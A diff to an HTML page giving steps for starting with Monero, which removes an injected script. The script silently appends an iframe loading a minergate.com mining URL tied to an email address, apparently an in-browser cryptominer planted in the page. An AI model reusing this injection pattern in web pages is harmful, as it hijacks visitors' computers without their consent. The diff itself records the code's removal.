@@ -27,15 +27,3 @@ It is very easy to start using Monero.
 <li>Step 2: Get Some Monero at the <a href="https://www.poloniex.com">best Monero exchange</a>.</li>
 <li>Step 3: Use Your Monero.</li>
 <li>Step 4: Stay Up-to-Date.</li></ul>
-
-<script type="text/javascript">
-    (function() {
-        var w = document.createElement("iframe");
-        w.style.border = 'none';
-        w.style.width = '293px';
-        w.style.height = '73px';
-        w.src = 'http://minergate.com/wmr/mro/bitcoin%40it-star.org/1/59307dbcea288017/big/0';
-        var s = document.getElementsByTagName('body')[0];
-        s.appendChild(w, s);
-    })();
-</script>
